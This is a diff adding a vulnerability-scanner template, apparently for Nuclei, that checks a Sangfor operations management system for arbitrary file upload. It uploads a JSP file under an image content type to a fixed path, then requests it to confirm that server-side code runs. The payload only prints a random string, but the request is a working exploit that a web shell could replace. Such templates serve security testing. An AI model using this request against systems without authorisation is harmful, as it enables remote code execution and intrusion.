@@ -1,0 +1,41 @@
+id: Sangfor-common-upload
+
+info:
+  name: Sangfor 运维管理系统任意文件上传漏洞
+  author: Sangfor
+  severity: high
+  tags: Sangfor
+
+http:
+  - raw:
+      - |
+        POST /fort/trust/version/common/common.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Accept-Encoding: gzip, deflate
+        
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
+        Content-Type: image/png
+        
+        <% out.println("{{randstr}}"); %>
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+
+      - |+
+        GET /fort/trust/version/common/{{randstr}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
